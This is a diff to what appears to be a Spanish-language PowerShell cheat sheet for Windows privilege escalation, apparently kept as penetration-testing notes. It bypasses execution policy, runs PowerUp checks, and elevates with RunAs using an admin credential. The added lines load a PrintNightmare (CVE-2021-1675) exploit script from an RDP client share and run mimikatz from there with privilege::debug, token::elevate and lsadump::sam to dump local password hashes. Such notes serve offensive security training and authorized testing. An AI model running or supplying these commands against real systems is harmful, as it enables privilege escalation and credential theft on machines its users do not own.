@@ -1,8 +1,12 @@
 # iniciar powershell con permisos para correr scripts
 powershell.exe -nop -exec bypass
 
+# Iniciar powershell como admin
+Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n
+
 # importar modulos
 Import-Module PowerUp.ps1
+. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1 # importar modulos de una compartida
 
 # oneLiner para correr un script
 C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”
@@ -126,3 +130,8 @@ Get-NetTCPConnection -State Listen | measure
 # Buscar puertos abiertos
 Test-NetConnection -ComputerName localhost -Port 443
 
+# mimikatz
+\\tsclient\share\x64\mimikatz.exe # ejecutar mimikatz desde una compartida
+privilege::debug
+token::elevate
+lsadump::sam
